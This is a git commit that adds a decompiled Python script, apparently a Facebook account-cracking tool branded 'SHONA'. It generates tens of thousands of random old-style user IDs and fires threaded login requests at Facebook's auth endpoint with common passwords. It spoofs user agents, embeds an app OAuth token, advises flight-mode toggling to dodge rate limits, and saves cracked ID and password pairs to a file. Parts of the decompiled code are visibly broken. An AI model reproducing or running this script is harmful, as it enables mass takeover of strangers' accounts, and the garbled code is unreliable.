509bc28973f87d7b1e0e64300d896448b6aa616c
alihhh55661 <64876551+alihhh55661@users.noreply.github.com>
2024-11-25 01:42:14 +0530

    Add files via upload

---
+++ live.py
@@ -0,0 +1,300 @@
+# di hapus komentar nya semoga anda mandul
+# Decode by FIRZAH
+# Github: https://github.com/FIRandZAH
+# WhatsApp: +62 831-7059-7744
+# Time: Sun Nov 24 11:48:32 2024
+# Decode Layers: 1
+# File: firzah.pyc (Python 3.12)
+
+import os
+import sys
+import json
+import uuid
+import string
+import random
+import requests
+from concurrent.futures import ThreadPoolExecutor
+import os
+import sys
+import json
+import uuid
+import string
+import random
+import requests
+from concurrent.futures import ThreadPoolExecutor as tred
+print('\n JOIN MY WHATSAPP GROUP')
+os.system('espeak -a 300 "  JOIN MY WHATSAPP GROUP "')
+os.system('xdg-open https://chat.whatsapp.com/K37a6CzuvvjJzTvgAWHcGZ')
+loop = 0
+oks = []
+cps = []
+gen = []
+
+def SEX22():
+    url5 = [
+        'Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0']
+    return random.choice(url5)
+
+
+def uax():
+    aV = str(random.choice(range(10, 20)))
+    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'''5{bx}.{bV}'''
+    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice([
+        '2',
+        '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'''5{cx}.{cV}'''
+    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice([
+        '2',
+        '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
+    D = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' + 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) facebook-nativefier-f52d2f/1.0.0 Chrome/53.0.2785.143 Electron/1.4.16 Safari/537.36' + 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Mobile Safari/537.36' + 'Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.66 Mobile Safari/537.36' + 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.97 Mobile Safari/537.36' + 'Mozilla/5.0 (Linux; Android 13; 23021RAA2Y Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.99 Mobile Safari/537.36' + 'Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36'
+    return random.choice([
+        A,
+        B,
+        C,
+        D])
+
+
+def fuck_xnxx():
+    rr = random.randint
+    aZ = random.choice([
+        'A',
+        'B',
+        'C',
+        'D',
+        'E',
+        'F',
+        'G',
+        'H',
+        'I',
+        'J',
+        'K',
+        'L',
+        'M',
+        'N',
+        'O',
+        'P',
+        'Q',
+        'R',
+        'S',
+        'T',
+        'U',
+        'V',
+        'W',
+        'X',
+        'Y',
+        'Z'])
+    rx = random.randrange(1, 999)
+    url6 = f'''Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'''
+    return url6
+
+
+def fuck_xnxxxx():
+    mcc = random.choice([
+        'SM-F711B',
+        'SM-F711N',
+        'SM-F711U',
+        'SM-F711U1',
+        'SM-E025F'])
+    url1 = f'''[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'''
+    return url1
+
+
+def fuck_xx():
+    url3 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
+    return url3
+
+
+def fuck_xnxxxxx():
+    realmi = random.choice([
+        'RMP2107',
+        'RMX3770',
+        'RMX2176',
+        'RMX3939',
+        'RMX3868'])
+    url4 = '[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/' + realmi + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
+    return url4
+
+ua = 'Mozilla/5.0 (Linux; Android 5.1.1; i-mobile IQ Z PRO Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.18.107;]'
+
+def clear():
+    os.system('clear')
+
+
+def ____banner____():
+    if 'win' in sys.platform:
+        os.system('cls')
+    os.system('clear')
+    print('\x1b[1;92m\n███████╗██╗  ██╗ ██████╗ ███╗   ██╗ █████╗ \n██╔════╝██║  ██║██╔═══██╗████╗  ██║██╔══██╗\n███████╗███████║██║   ██║██╔██╗ ██║███████║\n╚════██║██╔══██║██║   ██║██║╚██╗██║██╔══██║\n███████║██║  ██║╚██████╔╝██║ ╚████║██║  ██║\n╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝\n\n \x1b[1;37m==================================\n\x1b[1;37m Owner    : \x1b[1;92mSHONAV-:0.5\n\x1b[1;37m===================================')
+
+
+def creationyear(ids):
+    if len(ids) == 15:
+        if 10 in ('1000000000',):
+            SHONA = '2009'
+            return SHONA
+        if 9 in ('100000000',):
+            SHONA = '2009'
+            return SHONA
+        if 8 in ('10000000',):
+            SHONA = '2009'
+            return SHONA
+        if 7 in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
+            SHONA = '2009'
+            return SHONA
+        if 7 in ('1000006', '1000007', '1000008', '1000009'):
+            SHONA = '2010'
+            return SHONA
+        if 6 in ('100001',):
+            SHONA = '2010'
+            return SHONA
+        if 6 in ('100002', '100003'):
+            SHONA = '2011'
+            return SHONA
+        if 6 in ('100004',):
+            SHONA = '2012'
+            return SHONA
+        if 6 in ('100005', '100006'):
+            SHONA = '2013'
+            return SHONA
+        if 6 in ('100007', '100008'):
+            SHONA = '2014'
+            return SHONA
+        if 6 in ('100009',):
+            SHONA = '2015'
+            return SHONA
+        if 5 in ('10001',):
+            SHONA = '2016'
+            return SHONA
+        if 5 in ('10002',):
+            SHONA = '2017'
+            return SHONA
+        if 5 in ('10003',):
+            SHONA = '2018'
+            return SHONA
+        if 5 in ('10004',):
+            SHONA = '2019'
+            return SHONA
+        if 5 in ('10005',):
+            SHONA = '2020'
+            return SHONA
+        if 5 in ('10006',):
+            SHONA = '2021'
+            return SHONA
+        if 5 in ('10009',):
+            SHONA = '2023'
+            return SHONA
+        if 5 in ('10007', '10008'):
+            SHONA = '2022'
+            return SHONA
+        SHONA = None
+        return SHONA
+    if None(ids) in (9, 10):
+        SHONA = '2008'
+        return SHONA
+    if None(ids) == 8:
+        SHONA = '2007'
+        return SHONA
+    if None(ids) == 7:
+        SHONA = '2006'
+        return SHONA
+    if None(ids) == 14 and 2 in ('61',):
+        SHONA = '2024'
+        return SHONA
+    SHONA = None
+    return SHONA
+
+
+def main():
+    ____banner____()
+    os.system('espeak -a 300 " choice method "')
+    print('[1] START CLONE [\x1b[1;92m2009-2010]')
+    print('-------------------------------')
+    select = input('SELECT OPTION : ')
+    if select == '1':
+        SHONAOLD('100000')
+    else:
+        print("Invalid Option!")
+    main()
+
+
+def SHONAOLD(series):
+    global loop
+    gen = []
+    ____banner____()
+    if series == '100000':
+        SEX = '100000'
+        SEX2 = 9
+    for _ in range(99999):
+        AUH = ''.join(random.choice(string.digits) for _ in range(SEX2))
+        gen.append(AUH)
+
+    Fuck_xnxx = ThreadPoolExecutor(max_workers=7)
+    ____banner____()
+    print('TOTAL IDS - ' + str(len(gen)))
+    print('USE FLIGHT MODE EVERY 3 MIN')
+    print('-------------------------------')
+    for love in gen:
+        ids = SEX + love
+        passlist = [
+            '123456',
+            '1234567',
+            '12345678',
+            '123456789',
+            '000000',
+            '1234567890',
+            '123123',
+            '786786',
+            '112233'
+        ]
+        Fuck_xnxx.submit(Fucking_life, ids, passlist)
+
+    sys.exit('\n-------------------------------')
+
+
+def Fucking_life(ids, passlist):
+    global loop
+    sys.stdout.write(f'''\r\r\x1b[1;37m [SHONA-M3] {loop!s}|OK-{len(oks)!s} \x1b[1;32m''')
+    sys.stdout.flush()
+    for pas in passlist:
+        data = {
+            'api_key': '882a8490361da98702bf97a021ddc14d',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
+        head = {
+            'content-type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'user-agent': fuck_xnxx(),
+            'accept-encoding': 'gzip, deflate',
+            'x-fb-http-engine': 'Liger' }
+        url = 'https://b-api.facebook.com/auth/login'
+        response = requests.post(url, data = data, headers = head).json()
+        if 'access_token' in response:
+            print(f'''\r\r\x1b[1;32mSHONA-OK | {ids} • {pas}''')
+            open('/sdcard/SHONAOLD-OK.txt', 'a').write(ids + '|' + pas + '\n')
+            oks.append(ids)
+            'auth.login'
+        if not 'www.facebook.com' in response.get('error', { }).get('message', ''):
+            pass
+        'method'
+        loop += 1
+        return None
+        if Exception:
+            e = str(uuid.uuid4())
+            e = None
+            del e
+            return None
+            e = None
+            del e
+
+if __name__ == '__main__':
+    main()
